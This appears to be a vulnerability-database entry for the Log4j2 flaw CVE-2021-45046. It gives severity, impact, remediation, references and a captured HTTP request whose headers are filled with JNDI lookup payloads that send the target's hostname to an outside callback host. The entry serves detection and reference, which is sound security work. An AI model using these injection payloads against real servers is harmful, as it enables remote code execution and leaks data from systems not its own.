---
layout: "post"
cve_id: "CVE-2021-45046"
title: "Apache Log4j2 - Remote Code Injection"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-45046.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-45046.yaml"
author: "ImNightmaree"
severity: "critical"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the affected system.
"
remediation: "Apply the latest security patches or upgrade to a non-vulnerable version of Apache Log4j2.
"
reference:
  - "https://securitylab.github.com/advisories/GHSL-2021-1054_GHSL-2021-1055_log4j2/"
  - "https://twitter.com/marcioalm/status/1471740771581652995"
  - "https://logging.apache.org/log4j/2.x/"
  - "http://www.openwall.com/lists/oss-security/2021/12/14/4"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H', 'cvss-score': 9, 'cve-id': 'CVE-2021-45046', 'cwe-id': 'CWE-917', 'epss-score': 0.9434, 'epss-percentile': 0.99951, 'cpe': 'cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 1, 'vendor': 'apache', 'product': 'log4j'}"
tags:
  - "cve2021"
  - "cve"
  - "rce"
  - "oast"
  - "log4j"
  - "injection"
  - "kev"
  - "apache"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
Apache Log4j2 Thread Context Lookup Pattern is vulnerable to remote code execution in certain non-default configurations.

## üåê HTTP Request
```nohighlight
GET /?x=${jndi:ldap://127.0.0.1 HTTP/1.1
Host: www.victim.com
User-Agent: ${jndi:ldap://127.0.0.1#.${hostName}.useragent.d5iupn1le0o10u5fur501bififaxfujaj.oast.me}
Connection: close
Accept: ${jndi:ldap://127.0.0.1#.${hostName}.accept.d5iupn1le0o10u5fur50jb3fsd9fos6ng.oast.me}
Accept-Encoding: ${jndi:ldap://127.0.0.1#.${hostName}.acceptencoding.d5iupn1le0o10u5fur50mq6mfp6ei7abx.oast.me}
Accept-Language: ${jndi:ldap://127.0.0.1#.${hostName}.acceptlanguage.d5iupn1le0o10u5fur5073b3htdhe9xms.oast.me}
Access-Control-Request-Headers: ${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestheaders.d5iupn1le0o10u5fur50bkneeg1x6bhs8.oast.me}
Access-Control-Request-Method: ${jndi:ldap://127.0.0.1#.${hostName}.accesscontrolrequestmethod.d5iupn1le0o10u5fur50jwgghh5ihizo9.oast.me}
Authentication: Bearer ${jndi:ldap://127.0.0.1#.${hostName}.authenticationbearer.d5iupn1le0o10u5fur50d4a17uns99fsw.oast.me}
Cookie: ${jndi:ldap://127.0.0.1#.${hostName}.cookiename.d5iupn1le0o10u5fur50ommeaa881jxi3.oast.me}=${jndi:ldap://${hostName}.cookievalue.d5iupn1le0o10u5fur506qwxuaoznj1x4.oast.me}
Location: ${jndi:ldap://127.0.0.1#.${hostName}.location.d5iupn1le0o10u5fur50xh549wptxwe7x.oast.me}
Origin: ${jndi:ldap://127.0.0.1#.${hostName}.origin.d5iupn1le0o10u5fur50nimc3fbb9r488.oast.me}
Referer: ${jndi:ldap://127.0.0.1#.${hostName}.referer.d5iupn1le0o10u5fur50wcafypgxqbzez.oast.me}
Upgrade-Insecure-Requests: ${jndi:ldap://127.0.0.1#.${hostName}.upgradeinsecurerequests.d5iupn1le0o10u5fur505s1g8ipkmukp3.oast.me}
X-Api-Version: ${jndi:ldap://127.0.0.1#.${hostName}.xapiversion.d5iupn1le0o10u5fur50x6ebs3ap7mzbw.oast.me}
X-CSRF-Token: ${jndi:ldap://127.0.0.1#.${hostName}.xcsrftoken.d5iupn1le0o10u5fur50nopf4k3of5ddc.oast.me}
X-Druid-Comment: ${jndi:ldap://127.0.0.1#.${hostName}.xdruidcomment.d5iupn1le0o10u5fur5057f4ua8c3f189.oast.me}
X-Forwarded-For: ${jndi:ldap://127.0.0.1#.${hostName}.xforwardedfor.d5iupn1le0o10u5fur50qxqzx7d3qdycf.oast.me}
X-Origin: ${jndi:ldap://127.0.0.1#.${hostName}.xorigin.d5iupn1le0o10u5fur50d15uramrdcxc5.oast.me}
```

